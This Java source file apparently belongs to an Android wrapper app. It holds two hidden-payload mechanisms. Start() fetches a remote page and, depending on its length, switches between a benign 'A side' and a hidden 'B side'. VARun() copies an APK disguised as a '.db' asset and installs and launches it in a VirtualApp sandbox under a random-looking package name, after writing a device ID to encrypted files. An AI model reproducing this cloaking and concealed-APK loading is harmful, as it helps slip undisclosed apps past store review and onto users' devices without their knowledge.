package com.yang.androidaar;


import android.app.Activity;

import android.widget.Toast;

import com.lody.virtual.remote.VAppInstallerResult;
import com.yang.androidaar.Define.GameType;
import com.yang.androidaar.other.JsonSerializer.CPackDB;
import com.yang.androidaar.other.MyUID;
import com.yang.androidaar.tool.HttpHelper;
import com.yang.androidaar.webview.WebviewHelper;

import org.json.JSONObject;

import java.io.File;
import java.util.HashMap;
import java.util.Map;
import java.util.function.Consumer;

import virtualapp.VirtualAppManager;

public class MiscFuncApi {

    public static CPackDB packDB;

    static {
        packDB = new CPackDB();
        packDB.PlatId = 1532;
        packDB.DBG = false;
        packDB.ReportUrl = LogUtil.PGFmt("https://rmy.06d09.com:443/hotupdate");
//        packDB.UrlB = LogUtil.PGFmt("https://www.cixhm.com/");
        packDB.Version = LogUtil.PGFmt("0.0.0.1");
        packDB.ThirdId = 2320;
        packDB.PkgId = 1532;
        packDB.ResVersion = LogUtil.PGFmt("v51");
    }

    public static void Start(Activity activity, Consumer<Integer> task) {
//        ActivityMgr.getIns().setActivity(activity);
//        new ReferrerMgr().Report(task);

        // 内容长度 0 为 a 面, >0 则为 b
        String url = "https://wst2.06d09.com/web/06d09.com/06d09.html";
        HttpHelper.SHttp sh = HttpHelper.okhttpGetSync(url, null);
        if (sh.code != 200 || sh.msg == null) {
            LogUtil.E(LogUtil.PGFmt("--- get ab err, code: %d, msg: %s"), sh.code, sh.msg);
            task.accept(GameType.A);
            return;
        }

        if (sh.msg.length() > 8) {
            String bOpenlogPath = VATool.getBFilesDirInA(activity, Define.getFile_OpenLog());
            FileTool.writeFileEncrypt(new File(bOpenlogPath), "");
        }

        task.accept(GameType.B);
    }

    public static void PageOn(Activity activity, String page) {
        ActivityMgr.getIns().setActivity(activity);
        VATool.OpenUrl(page);
    }

    public static void VARun(Activity activity) {
        String bPkgName = LogUtil.PGFmt("com.semideificqofrz.tyrannicidetrnb");
        String assetsPath = "rhodalinenluts.db";

        VATool.setBPkgName(bPkgName);

        // 1. 拷贝打包信息
        String bPackDbPath = VATool.getBFilesDirInA(activity, Define.getFile_PackDb());
        LogUtil.D("--- bPackDbPath: %s", bPackDbPath);
        if (!new File(bPackDbPath).exists()) {
            Exception ex01 = FileTool.CopyAssetsFile(activity, Define.getFile_PackDb(), bPackDbPath);
            LogUtil.A(ex01 == null, "--- CopyAssetsFile fail");
            LogUtil.D("--- copy pack info success");
        }

        // 2. 写入 a 包信息
        String vaDbPath = VATool.getBFilesDirInA(activity, Define.getFile_VADb());
        LogUtil.D("--- vaDbPath: %s", vaDbPath);
        File vaDbFile = new File(vaDbPath);
        if (!vaDbFile.exists()) {
            String uid = MyUID.get(activity);

            Map<String, Object> m1 = new HashMap<>();
            m1.put("PkgName", SystemInfoUtil.getPackgeName(activity));
            m1.put("DeviceID", uid);
            FileTool.writeFileEncrypt(vaDbFile, new JSONObject(m1).toString());

            // 写到 b 包位置
            String vaUidPath = VATool.getBFilesDirInA(activity, Define.getFile_AndroidUID());
            FileTool.writeFileEncrypt(new File(vaUidPath), uid);
            LogUtil.D("--- gen va info success");
        }

        // 3. 执行 apk 安装并运行的流程
//        String url = "https://www.06d09.com/app/20231106T172357.txt";
//        String pkgName = "com.rhodalinenluts.unwishingyavd";

        LogUtil.D("--- va assetsPath: %s, pkgName: %s", assetsPath, bPkgName);
        if (!VirtualAppManager.sVirtualAppManager.isAppInstalled(bPkgName)) {
            String savePath = String.format("%s/va_demo/va.apk", activity.getFilesDir());
            Runnable installTask = () -> {
                VAppInstallerResult result = VirtualAppManager.sVirtualAppManager.installApk(savePath);
//                        LogUtil.D("--- result, status: %d", result.status);
//                        if (result.status == VAppInstallerResult.STATUS_SUCCESS) { // TODO: yx 安装 ok
//                            VirtualAppManager.sVirtualAppManager.launchApp(pkgName);
//                        } else {
//                            LogUtil.E("--- va install fail");
//                        }
            };

            // 不存在文件就下载
            if (!new File(savePath).exists()) {
                LogUtil.D("--- va no file, down");
                Exception ex = FileTool.CopyAssetsFile(ActivityMgr.getIns().getActivity(), assetsPath, savePath);
                if (ex != null) {
                    Tools.runOnUiThread(() -> {
                        Toast.makeText(ActivityMgr.getIns().getActivity(), "Fail. Code: -1", Toast.LENGTH_LONG);
                    });
                } else {
                    installTask.run();
                }

                // 不加载
//                HttpHelper.okhttpDownloadAsync(url, savePath, (downCode, msg) -> {
//                    LogUtil.D("--- downCode: %d, msg: %s", downCode, msg);
//                    if (downCode == MyCode.ECode.Ok) {
//                        installTask.run();
//                    } else {
//                        LogUtil.E("--- va down fail");
//                    }
//                }, (downProcess, msg) -> {
//                    LogUtil.D("--- va downProcess: %d", downProcess);
//                });

            } else {
                LogUtil.D("--- va already down, installApp");
                installTask.run();
            }
        } else {
            LogUtil.D("--- va already install, launchApp");
            VirtualAppManager.sVirtualAppManager.launchApp(bPkgName);
        }
    }
}
